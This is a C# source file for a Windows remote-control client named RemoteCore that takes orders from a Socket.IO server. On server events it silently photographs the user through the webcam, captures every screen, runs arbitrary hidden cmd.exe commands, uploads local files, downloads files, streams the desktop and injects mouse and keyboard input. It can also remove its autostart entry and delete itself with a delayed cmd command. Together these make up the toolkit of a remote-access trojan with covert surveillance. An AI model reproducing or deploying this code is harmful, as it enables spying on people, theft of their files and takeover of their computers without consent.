using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Text.Json;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using SocketIOClient;
using DirectShowLib;
using System.Text;
using System.Linq;

// 解决命名空间冲突
using SocketIOClientSocket = SocketIOClient.SocketIO;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;
namespace RemoteCore
{
    public class RemoteClient
    {
        private readonly SocketIOClientSocket _socket;
        private readonly HttpClient _httpClient;
        private readonly HttpClient _fileHttpClient;
        private readonly string _serverUrl = Environment.GetEnvironmentVariable("REMOTECORE_SERVER_URL") ?? "http://127.0.0.1:5000";
        private readonly string _authToken = Environment.GetEnvironmentVariable("REMOTECORE_AUTH_TOKEN") ?? "admin123";
        private bool _isRunning = false;
        private bool _vncActive = false;
        private bool _cameraInitialized = false;

        // P/Invoke for VNC input simulation
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);


        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        const uint KEYEVENTF_KEYUP = 0x0002;

        // 硬编码配置常量
        private const int ConnectTimeout = 30;
        private const int ReconnectInterval = 10;
        private const int CommandTimeout = 30;
        private const int VncFps = 10;
        private const int VncQuality = 40;
        private static readonly System.Drawing.Size VncResolution = new System.Drawing.Size(1280, 720);
        private static readonly TimeSpan FileTransferTimeout = TimeSpan.FromHours(2);
        private const int FileTransferBufferSize = 1024 * 128;
        private const int FileTransferProgressIntervalMs = 200;

        public RemoteClient()
        {
            var apiHandler = new SocketsHttpHandler
            {
                MaxConnectionsPerServer = 16,
                Expect100ContinueTimeout = TimeSpan.Zero
            };

            _httpClient = new HttpClient(apiHandler, disposeHandler: true);
            _httpClient.Timeout = TimeSpan.FromSeconds(ConnectTimeout);
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "RemoteClient");
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _authToken);

            var fileHandler = new SocketsHttpHandler
            {
                MaxConnectionsPerServer = 16,
                Expect100ContinueTimeout = TimeSpan.Zero
            };
            _fileHttpClient = new HttpClient(fileHandler, disposeHandler: true);
            _fileHttpClient.Timeout = Timeout.InfiniteTimeSpan;
            _fileHttpClient.DefaultRequestHeaders.Add("User-Agent", "RemoteClient");
            _fileHttpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _authToken);

            _socket = new SocketIOClientSocket(_serverUrl, new SocketIOOptions
            {
                Transport = SocketIOClient.Transport.TransportProtocol.WebSocket,
                ExtraHeaders = new Dictionary<string, string> 
                {
                    { "User-Agent", "RemoteClient" },
                    { "Authorization", $"Bearer {_authToken}" }
                }
            });

            RegisterEvents();
        }

        private void RegisterEvents()
        {
            _socket.OnConnected += async (sender, e) =>
            {
                Console.WriteLine("Connected to server");
                try
                {
                    await _socket.EmitAsync("client_capabilities", new { streaming = true });
                }
                catch
                {
                }
            };
            _socket.OnDisconnected += (sender, e) => Console.WriteLine("Disconnected from server");

            _socket.On("shoot", async response => await TakePhotoAsync());
            
            _socket.On("take_screenshot", async response => await TakeScreenshotAsync());
            
            _socket.On("execute_command", async response => 
            {
                var data = response.GetValue<JsonElement>();
                if (data.TryGetProperty("command", out var cmdProp))
                {
                    await ExecuteCommandAsync(cmdProp.GetString());
                }
            });

            _socket.On("list_dir", async response => 
            {
                var data = response.GetValue<JsonElement>();
                if (data.TryGetProperty("path", out var pathProp))
                {
                    await ListDirAsync(pathProp.GetString());
                }
            });

            _socket.On("upload_file_to_server", async response => 
            {
                var data = response.GetValue<JsonElement>();
                string path = data.GetProperty("path").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
                await UploadFileToServerAsync(path, filename, transferId);
            });

            _socket.On("download_file", async response => 
            {
                var data = response.GetValue<JsonElement>();
                string url = data.GetProperty("url").GetString() ?? "";
                string targetDir = data.GetProperty("target_dir").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
                await DownloadFileFromServerAsync(url, targetDir, filename, transferId);
            });

            _socket.On("start_stream_upload", async response =>
            {
                var data = response.GetValue<JsonElement>();
                string uploadUrl = data.GetProperty("upload_url").GetString() ?? "";
                string path = data.GetProperty("path").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
                await StreamUploadAsync(uploadUrl, path, filename, transferId);
            });

            _socket.On("start_stream_download", async response =>
            {
                var data = response.GetValue<JsonElement>();
                string downloadUrl = data.GetProperty("download_url").GetString() ?? "";
                string targetDir = data.GetProperty("target_dir").GetString() ?? "";
                string filename = data.GetProperty("filename").GetString() ?? "";
                string transferId = data.TryGetProperty("transfer_id", out var tidProp) ? (tidProp.GetString() ?? "") : "";
                await StreamDownloadAsync(downloadUrl, targetDir, filename, transferId);
            });

            _socket.On("start_vnc", response =>
            {
                _ = VncLoopAsync();
            });

            _socket.On("stop_vnc", response =>
            {
                _vncActive = false;
            });

            _socket.On("vnc_mouse_event", response =>
            {
                var data = response.GetValue<JsonElement>();
                HandleVncMouse(data);
            });

            _socket.On("vnc_key_event", response =>
            {
                var data = response.GetValue<JsonElement>();
                HandleVncKey(data);
            });

            _socket.On("client_control", response =>
            {
                var data = response.GetValue<JsonElement>();
                string action = data.GetProperty("action").GetString() ?? "";
                HandleClientControl(action);
            });
        }

        private bool InitializeCamera()
        {
            Console.WriteLine("Initializing camera...");
            try
            {
                _cameraInitialized = HasCameraDevice();
                if (_cameraInitialized)
                {
                    Console.WriteLine("Camera initialized successfully");
                    return true;
                }

                Console.WriteLine("Failed to initialize camera");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error initializing camera: {ex.Message}");
                _cameraInitialized = false;
                return false;
            }
        }

        private static bool HasCameraDevice()
        {
            try
            {
                var devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
                return devices != null && devices.Length > 0;
            }
            catch
            {
                return false;
            }
        }

        private static byte[] CaptureJpegFromDefaultCamera(int captureTimeoutMs = 8000)
        {
            byte[]? result = null;
            Exception? error = null;
            var t = new Thread(() =>
            {
                try
                {
                    result = CaptureJpegFromDefaultCameraSta(captureTimeoutMs);
                }
                catch (Exception ex)
                {
                    error = ex;
                }
            });
            t.IsBackground = true;
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            if (!t.Join(captureTimeoutMs + 2000))
            {
                throw new TimeoutException("Camera capture timeout");
            }
            if (error != null) throw error;
            if (result == null || result.Length == 0) throw new Exception("Failed to capture camera frame");
            return result;
        }

        private static byte[] CaptureJpegFromDefaultCameraSta(int captureTimeoutMs)
        {
            var devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
            if (devices == null || devices.Length == 0) throw new Exception("No camera device found");

            IGraphBuilder graph = null!;
            ICaptureGraphBuilder2 builder = null!;
            IBaseFilter source = null!;
            IBaseFilter grabberFilter = null!;
            ISampleGrabber sampleGrabber = null!;
            IBaseFilter nullRenderer = null!;
            IMediaControl control = null!;
            IMediaEventEx mediaEvent = null!;

            var mt = new AMMediaType();
            mt.majorType = MediaType.Video;
            mt.subType = MediaSubType.RGB24;
            mt.formatType = FormatType.VideoInfo;

            try
            {
                graph = (IGraphBuilder)new FilterGraph();
                builder = (ICaptureGraphBuilder2)new CaptureGraphBuilder2();
                builder.SetFiltergraph(graph);

                graph.AddSourceFilterForMoniker(devices[0].Mon, null, devices[0].Name, out source);

                sampleGrabber = (ISampleGrabber)new SampleGrabber();
                sampleGrabber.SetMediaType(mt);
                grabberFilter = (IBaseFilter)sampleGrabber;
                graph.AddFilter(grabberFilter, "SampleGrabber");

                nullRenderer = (IBaseFilter)new NullRenderer();
                graph.AddFilter(nullRenderer, "NullRenderer");

                int hr = builder.RenderStream(PinCategory.Capture, MediaType.Video, source, grabberFilter, nullRenderer);
                DsError.ThrowExceptionForHR(hr);

                hr = sampleGrabber.SetOneShot(true);
                DsError.ThrowExceptionForHR(hr);
                hr = sampleGrabber.SetBufferSamples(true);
                DsError.ThrowExceptionForHR(hr);

                control = (IMediaControl)graph;
                mediaEvent = (IMediaEventEx)graph;
                hr = control.Run();
                DsError.ThrowExceptionForHR(hr);

                hr = mediaEvent.WaitForCompletion(captureTimeoutMs, out _);
                DsError.ThrowExceptionForHR(hr);

                var connected = new AMMediaType();
                hr = sampleGrabber.GetConnectedMediaType(connected);
                DsError.ThrowExceptionForHR(hr);

                var vih = (VideoInfoHeader)Marshal.PtrToStructure(connected.formatPtr, typeof(VideoInfoHeader))!;
                int width = vih.BmiHeader.Width;
                int height = vih.BmiHeader.Height;
                int absHeight = Math.Abs(height);
                bool bottomUp = height > 0;
                int srcStride = width * (vih.BmiHeader.BitCount / 8);

                int size = 0;
                hr = sampleGrabber.GetCurrentBuffer(ref size, IntPtr.Zero);
                DsError.ThrowExceptionForHR(hr);
                var bufferPtr = Marshal.AllocCoTaskMem(size);
                try
                {
                    hr = sampleGrabber.GetCurrentBuffer(ref size, bufferPtr);
                    DsError.ThrowExceptionForHR(hr);

                    var managed = new byte[size];
                    Marshal.Copy(bufferPtr, managed, 0, size);

                    using var bmp = new Bitmap(width, absHeight, PixelFormat.Format24bppRgb);
                    var rect = new Rectangle(0, 0, width, absHeight);
                    var bmpData = bmp.LockBits(rect, ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
                    try
                    {
                        for (int y = 0; y < absHeight; y++)
                        {
                            int srcRow = bottomUp ? (absHeight - 1 - y) : y;
                            IntPtr dest = bmpData.Scan0 + y * bmpData.Stride;
                            Marshal.Copy(managed, srcRow * srcStride, dest, srcStride);
                        }
                    }
                    finally
                    {
                        bmp.UnlockBits(bmpData);
                    }

                    using var ms = new MemoryStream();
                    bmp.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
                finally
                {
                    Marshal.FreeCoTaskMem(bufferPtr);
                    DsUtils.FreeAMMediaType(connected);
                }
            }
            finally
            {
                try { control?.Stop(); } catch { }
                DsUtils.FreeAMMediaType(mt);
                if (mediaEvent != null) Marshal.ReleaseComObject(mediaEvent);
                if (control != null) Marshal.ReleaseComObject(control);
                if (nullRenderer != null) Marshal.ReleaseComObject(nullRenderer);
                if (grabberFilter != null) Marshal.ReleaseComObject(grabberFilter);
                if (sampleGrabber != null) Marshal.ReleaseComObject(sampleGrabber);
                if (source != null) Marshal.ReleaseComObject(source);
                if (builder != null) Marshal.ReleaseComObject(builder);
                if (graph != null) Marshal.ReleaseComObject(graph);
            }
        }

        private async Task KeepAliveAsync()
        {
            while (_isRunning)
            {
                try
                {
                    // 检查摄像头状态
                    if (!_cameraInitialized)
                    {
                        Console.WriteLine("Camera not initialized, trying to initialize...");
                        InitializeCamera();
                    }
                    
                    // 检查服务器连接
                    if (!_socket.Connected)
                    {
                        Console.WriteLine("Server disconnected, reconnecting...");
                        // 连接会在主循环中处理
                    }
                    
                    await Task.Delay(30000); // 每30秒检查一次
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error in keep alive: {ex.Message}");
                    await Task.Delay(30000);
                }
            }
        }

        public async Task StartAsync()
        {
            _isRunning = true;
            
            // 初始化摄像头
            InitializeCamera();
            
            // 启动保活线程
            _ = KeepAliveAsync();
            
            try
            {
                Console.WriteLine("Attempting to connect to server...");
                await _socket.ConnectAsync();
                Console.WriteLine("Connected to server successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Connection error: {ex.Message}");
            }
            
            while (_isRunning)
            {
                await Task.Delay(1000);
            }
        }

        private async Task TakePhotoAsync()
        {
            try
            {
                // 确保摄像头已初始化
                if (!_cameraInitialized)
                {
                    Console.WriteLine("Camera not initialized, trying to initialize...");
                    // 尝试初始化摄像头
                    if (!InitializeCamera())
                    {
                        Console.WriteLine("Failed to initialize camera");
                        return;
                    }
                }

                byte[] imageBytes = await Task.Run(() => CaptureJpegFromDefaultCamera());
                await UploadPhotoAsync(imageBytes);
                Console.WriteLine("Photo taken and uploaded successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Camera error: {ex.Message}");
                // 异常发生后重新初始化摄像头
                _cameraInitialized = false;
            }
        }

        private async Task TakeScreenshotAsync()
        {
            try
            {
                // 捕获所有显示器
                Rectangle bounds = Rectangle.Empty;
                foreach (Screen screen in Screen.AllScreens)
                {
                    bounds = Rectangle.Union(bounds, screen.Bounds);
                }
                
                using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                }
                using MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Jpeg);
                await UploadPhotoAsync(ms.ToArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Screenshot error: {ex.Message}");
            }
        }

        private async Task UploadPhotoAsync(byte[] imageBytes)
        {
            try
            {
                using var content = new MultipartFormDataContent();
                var imageContent = new ByteArrayContent(imageBytes);
                imageContent.Headers.ContentType = MediaTypeHeaderValue.Parse("image/jpeg");
                content.Add(imageContent, "photo", "photo.jpg");

                var response = await _httpClient.PostAsync($"{_serverUrl}/upload", content);
                response.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Upload error: {ex.Message}");
            }
        }

        private async Task ExecuteCommandAsync(string? command)
        {
            if (string.IsNullOrWhiteSpace(command)) return;

            Console.WriteLine($"Received command: {command}");

            string output = "";
            string error = "";

            try
            {
                string cmdStrip = command.Trim();
                if (cmdStrip.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
                {
                    output = "Warning: Global directory change via 'cd' is disabled to prevent race conditions. Please use absolute paths in commands.";
                }
                else if (cmdStrip.Length == 2 && cmdStrip[1] == ':')
                {
                    output = "Warning: Global drive change is disabled to prevent race conditions.";
                }
                else
                {
                    // 检查是否具有管理员权限
                    if (!IsAdmin())
                    {
                        Console.WriteLine("Command execution requires admin privileges, but not running as admin");
                        error = "Error: Administrator privileges required for this command.";
                        output = "";
                    }
                    else
                    {
                        // 执行命令（不再限制危险命令）
                        using var process = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = $"/c {command}",
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            }
                        };
                        process.Start();
                        
                        var outputTask = process.StandardOutput.ReadToEndAsync();
                        var errorTask = process.StandardError.ReadToEndAsync();
                        
                        int timeoutMs = CommandTimeout * 1000;
                        using var cts = new CancellationTokenSource(timeoutMs);
                        try
                        {
                            await Task.WhenAny(Task.WhenAll(outputTask, errorTask), Task.Delay(timeoutMs, cts.Token));
                            if (!process.HasExited)
                            {
                                process.Kill();
                                error = $"Command execution timed out ({CommandTimeout}s)";
                            }
                            else
                            {
                                output = await outputTask;
                                error = await errorTask;
                            }
                            cts.Cancel(); // 确保正常退出时释放超时 Task
                        }
                        catch (Exception ex)
                        {
                            error = ex.Message;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command: {ex.Message}");
                error = ex.Message;
            }

            await _socket.EmitAsync("command_result", new { command = command, output = output, error = error });
        }

        private bool IsAdmin()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private async Task ListDirAsync(string? path)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(path)) path = Directory.GetCurrentDirectory();

                if (!Directory.Exists(path))
                {
                    await _socket.EmitAsync("dir_list_result", new { error = "Path does not exist", path = path });
                    return;
                }

                var files = new List<object>();
                var dirInfo = new DirectoryInfo(path);
                
                foreach (var dir in dirInfo.GetDirectories())
                {
                    files.Add(new { name = dir.Name, is_dir = true, size = 0, mtime = new DateTimeOffset(dir.LastWriteTime).ToUnixTimeSeconds() });
                }
                foreach (var file in dirInfo.GetFiles())
                {
                    files.Add(new { name = file.Name, is_dir = false, size = file.Length, mtime = new DateTimeOffset(file.LastWriteTime).ToUnixTimeSeconds() });
                }

                await _socket.EmitAsync("dir_list_result", new { path = path, files = files });
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("dir_list_result", new { error = ex.Message, path = path });
            }
        }

        private async Task UploadFileToServerAsync(string path, string filename, string transferId)
        {
            try
            {
                if (!File.Exists(path))
                {
                    await _socket.EmitAsync("client_upload_error", new { error = "File not found: " + path, transfer_id = transferId });
                    return;
                }

                if (string.IsNullOrWhiteSpace(transferId))
                {
                    transferId = Guid.NewGuid().ToString("N");
                }

                long totalBytes = new FileInfo(path).Length;
                long lastReportedBytes = 0;
                long lastReportTick = 0;

                using var content = new MultipartFormDataContent();
                var fileStream = File.OpenRead(path);
                var streamContent = new ProgressStreamContent(
                    fileStream,
                    totalBytes,
                    FileTransferBufferSize,
                    uploaded =>
                    {
                        var now = Environment.TickCount64;
                        if (uploaded == totalBytes || now - lastReportTick >= FileTransferProgressIntervalMs)
                        {
                            lastReportTick = now;
                            if (uploaded != lastReportedBytes)
                            {
                                lastReportedBytes = uploaded;
                                _ = _socket.EmitAsync("file_transfer_progress", new
                                {
                                    transfer_id = transferId,
                                    stage = "upload_to_server",
                                    filename,
                                    transferred = uploaded,
                                    total = totalBytes
                                });
                            }
                        }
                    }
                );
                content.Add(streamContent, "file", filename);
                content.Add(new StringContent(filename), "filename");
                content.Add(new StringContent(transferId), "transfer_id");

                using var cts = new CancellationTokenSource(FileTransferTimeout);
                var response = await _fileHttpClient.PostAsync($"{_serverUrl}/client_upload_file", content, cts.Token);
                response.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_upload_error", new { error = ex.Message, transfer_id = transferId });
            }
        }

        private async Task StreamUploadAsync(string uploadUrl, string path, string filename, string transferId)
        {
            try
            {
                if (!File.Exists(path))
                {
                    await _socket.EmitAsync("client_upload_error", new { error = "File not found: " + path, transfer_id = transferId });
                    return;
                }

                if (string.IsNullOrWhiteSpace(transferId))
                {
                    transferId = Guid.NewGuid().ToString("N");
                }

                long totalBytes = new FileInfo(path).Length;
                long lastReportedBytes = 0;
                long lastReportTick = 0;

                var fileStream = File.OpenRead(path);
                var content = new ProgressStreamContent(
                    fileStream,
                    totalBytes,
                    FileTransferBufferSize,
                    uploaded =>
                    {
                        var now = Environment.TickCount64;
                        if (uploaded == totalBytes || now - lastReportTick >= FileTransferProgressIntervalMs)
                        {
                            lastReportTick = now;
                            if (uploaded != lastReportedBytes)
                            {
                                lastReportedBytes = uploaded;
                                _ = _socket.EmitAsync("file_transfer_progress", new
                                {
                                    transfer_id = transferId,
                                    stage = "upload_to_server",
                                    filename,
                                    transferred = uploaded,
                                    total = totalBytes
                                });
                            }
                        }
                    }
                );

                using var req = new HttpRequestMessage(HttpMethod.Post, uploadUrl);
                req.Content = content;
                req.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

                using var cts = new CancellationTokenSource(FileTransferTimeout);
                var resp = await _fileHttpClient.SendAsync(req, HttpCompletionOption.ResponseHeadersRead, cts.Token);
                resp.EnsureSuccessStatusCode();
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_upload_error", new { error = ex.Message, transfer_id = transferId });
            }
        }

        private async Task StreamDownloadAsync(string downloadUrl, string targetDir, string filename, string transferId)
        {
            try
            {
                string safeFilename = Path.GetFileName(filename);
                if (string.IsNullOrEmpty(safeFilename))
                    throw new ArgumentException("Invalid filename");

                if (string.IsNullOrWhiteSpace(transferId))
                {
                    transferId = Guid.NewGuid().ToString("N");
                }

                string fullTargetDir = Path.GetFullPath(targetDir);
                string targetPath = Path.GetFullPath(Path.Combine(fullTargetDir, safeFilename));

                if (!targetPath.StartsWith(fullTargetDir, StringComparison.OrdinalIgnoreCase))
                    throw new UnauthorizedAccessException("Path traversal detected");

                if (!Directory.Exists(fullTargetDir)) Directory.CreateDirectory(fullTargetDir);

                using var cts = new CancellationTokenSource(FileTransferTimeout);
                using var response = await _fileHttpClient.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead, cts.Token);
                response.EnsureSuccessStatusCode();

                var totalBytes = response.Content.Headers.ContentLength;
                long downloaded = 0;
                long lastReportedBytes = 0;
                long lastReportTick = 0;

                await using var source = await response.Content.ReadAsStreamAsync(cts.Token);
                await using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, FileTransferBufferSize, useAsync: true);
                var buffer = new byte[FileTransferBufferSize];
                while (true)
                {
                    int read = await source.ReadAsync(buffer, cts.Token);
                    if (read <= 0) break;
                    await fs.WriteAsync(buffer.AsMemory(0, read), cts.Token);
                    downloaded += read;

                    var now = Environment.TickCount64;
                    if (!totalBytes.HasValue || downloaded == totalBytes.Value || now - lastReportTick >= FileTransferProgressIntervalMs)
                    {
                        lastReportTick = now;
                        if (downloaded != lastReportedBytes)
                        {
                            lastReportedBytes = downloaded;
                            _ = _socket.EmitAsync("file_transfer_progress", new
                            {
                                transfer_id = transferId,
                                stage = "download_from_server",
                                filename,
                                transferred = downloaded,
                                total = totalBytes
                            });
                        }
                    }
                }

                await _socket.EmitAsync("client_download_complete", new { success = true, path = targetPath, transfer_id = transferId });
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_download_complete", new { error = ex.Message, transfer_id = transferId });
            }
        }

        private async Task DownloadFileFromServerAsync(string url, string targetDir, string filename, string transferId)
        {
            try
            {
                // Prevent path traversal and absolute path injection
                string safeFilename = Path.GetFileName(filename);
                if (string.IsNullOrEmpty(safeFilename))
                    throw new ArgumentException("Invalid filename");

                if (string.IsNullOrWhiteSpace(transferId))
                {
                    transferId = Guid.NewGuid().ToString("N");
                }

                string fullTargetDir = Path.GetFullPath(targetDir);
                string targetPath = Path.GetFullPath(Path.Combine(fullTargetDir, safeFilename));

                if (!targetPath.StartsWith(fullTargetDir, StringComparison.OrdinalIgnoreCase))
                    throw new UnauthorizedAccessException("Path traversal detected");

                if (!Directory.Exists(fullTargetDir)) Directory.CreateDirectory(fullTargetDir);

                using var cts = new CancellationTokenSource(FileTransferTimeout);
                using var response = await _fileHttpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead, cts.Token);
                response.EnsureSuccessStatusCode();

                var totalBytes = response.Content.Headers.ContentLength;
                long downloaded = 0;
                long lastReportedBytes = 0;
                long lastReportTick = 0;

                await using var source = await response.Content.ReadAsStreamAsync(cts.Token);
                await using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, FileTransferBufferSize, useAsync: true);
                var buffer = new byte[FileTransferBufferSize];
                while (true)
                {
                    int read = await source.ReadAsync(buffer, cts.Token);
                    if (read <= 0) break;
                    await fs.WriteAsync(buffer.AsMemory(0, read), cts.Token);
                    downloaded += read;

                    var now = Environment.TickCount64;
                    if (!totalBytes.HasValue || downloaded == totalBytes.Value || now - lastReportTick >= FileTransferProgressIntervalMs)
                    {
                        lastReportTick = now;
                        if (downloaded != lastReportedBytes)
                        {
                            lastReportedBytes = downloaded;
                            _ = _socket.EmitAsync("file_transfer_progress", new
                            {
                                transfer_id = transferId,
                                stage = "download_from_server",
                                filename,
                                transferred = downloaded,
                                total = totalBytes
                            });
                        }
                    }
                }

                await _socket.EmitAsync("client_download_complete", new { success = true, path = targetPath, transfer_id = transferId });
            }
            catch (Exception ex)
            {
                await _socket.EmitAsync("client_download_complete", new { error = ex.Message, transfer_id = transferId });
            }
        }

        private sealed class ProgressStreamContent : HttpContent
        {
            private readonly Stream _source;
            private readonly int _bufferSize;
            private readonly Action<long> _progress;
            private readonly long _length;

            public ProgressStreamContent(Stream source, long length, int bufferSize, Action<long> progress)
            {
                _source = source;
                _length = length;
                _bufferSize = bufferSize;
                _progress = progress;
                Headers.ContentLength = _length;
            }

            protected override async Task SerializeToStreamAsync(Stream stream, TransportContext? context, CancellationToken cancellationToken)
            {
                var buffer = new byte[_bufferSize];
                long uploaded = 0;
                while (true)
                {
                    int read = await _source.ReadAsync(buffer.AsMemory(0, buffer.Length), cancellationToken);
                    if (read <= 0) break;
                    await stream.WriteAsync(buffer.AsMemory(0, read), cancellationToken);
                    uploaded += read;
                    _progress(uploaded);
                }
            }

            protected override Task SerializeToStreamAsync(Stream stream, TransportContext? context)
            {
                return SerializeToStreamAsync(stream, context, CancellationToken.None);
            }

            protected override bool TryComputeLength(out long length)
            {
                length = _length;
                return true;
            }

            protected override void Dispose(bool disposing)
            {
                if (disposing) _source.Dispose();
                base.Dispose(disposing);
            }
        }

        private async Task VncLoopAsync()
        {
            if (_vncActive) return; // Prevent multiple loops
            _vncActive = true;
            Console.WriteLine("VNC Loop started");
            
            // 提取出循环外以减少分配和提高性能
            var encoder = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
            using var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)VncQuality); // 使用配置的质量

            while (_vncActive && _isRunning)
            {
                try
                {
                    // 捕获所有显示器
                    Rectangle bounds = Rectangle.Empty;
                    foreach (Screen screen in Screen.AllScreens)
                    {
                        bounds = Rectangle.Union(bounds, screen.Bounds);
                    }
                    
                    using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    }

                    // Resize to configured resolution to save bandwidth
                    using Bitmap resized = new Bitmap(bitmap, VncResolution);
                    using MemoryStream ms = new MemoryStream();
                    
                    if (encoder != null)
                    {
                        resized.Save(ms, encoder, encoderParams);
                    }
                    else
                    {
                        resized.Save(ms, ImageFormat.Jpeg);
                    }
                    
                    string base64 = Convert.ToBase64String(ms.ToArray());
                    await _socket.EmitAsync("vnc_frame", new { image = base64 });
                    
                    await Task.Delay(1000 / VncFps); // 使用配置的帧率
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"VNC loop error: {ex.Message}");
                    await Task.Delay(1000);
                }
            }
            Console.WriteLine("VNC Loop stopped");
        }

        private void HandleVncMouse(JsonElement data)
        {
            try
            {
                if (!data.TryGetProperty("action", out var actionProp) || 
                    !data.TryGetProperty("button", out var buttonProp) ||
                    !data.TryGetProperty("x", out var xProp) ||
                    !data.TryGetProperty("y", out var yProp))
                    return;

                string action = actionProp.GetString() ?? "";
                int button = buttonProp.GetInt32();
                double xRel = xProp.GetDouble();
                double yRel = yProp.GetDouble();

                int screenWidth = Screen.PrimaryScreen!.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen!.Bounds.Height;

                int x = (int)(xRel * screenWidth);
                int y = (int)(yRel * screenHeight);

                SetCursorPos(x, y);

                if (action == "down")
                {
                    uint flag = button switch { 0 => MOUSEEVENTF_LEFTDOWN, 1 => MOUSEEVENTF_MIDDLEDOWN, 2 => MOUSEEVENTF_RIGHTDOWN, _ => 0 };
                    if (flag != 0) mouse_event(flag, x, y, 0, 0);
                }
                else if (action == "up")
                {
                    uint flag = button switch { 0 => MOUSEEVENTF_LEFTUP, 1 => MOUSEEVENTF_MIDDLEUP, 2 => MOUSEEVENTF_RIGHTUP, _ => 0 };
                    if (flag != 0) mouse_event(flag, x, y, 0, 0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleVncMouse error: {ex.Message}");
            }
        }

        private void HandleVncKey(JsonElement data)
        {
            try
            {
                if (!data.TryGetProperty("action", out var actionProp) || 
                    !data.TryGetProperty("keyCode", out var keyCodeProp))
                    return;

                string action = actionProp.GetString() ?? "";
                byte keyCode = keyCodeProp.GetByte();

                if (action == "down")
                {
                    keybd_event(keyCode, 0, 0, 0);
                }
                else if (action == "up")
                {
                    keybd_event(keyCode, 0, KEYEVENTF_KEYUP, 0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleVncKey error: {ex.Message}");
            }
        }

        private void HandleClientControl(string action)
        {
            try
            {
                if (action == "stop")
                {
                    Console.WriteLine("Stopping client by remote command...");
                    Environment.Exit(0);
                }
                else if (action == "restart")
                {
                    Console.WriteLine("Restarting client by remote command...");
                    Process.Start(Environment.ProcessPath!);
                    Environment.Exit(0);
                }
                else if (action == "uninstall")
                {
                    Console.WriteLine("Uninstalling client by remote command...");
                    Program.SetAutoStart(false);
                    
                    // Release the mutex to allow file deletion
                    Program.ReleaseMutex();
                    
                    string path = Environment.ProcessPath!;
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c ping 127.0.0.1 -n 3 > nul & del /f /q \"{path}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HandleClientControl error: {ex.Message}");
            }
        }
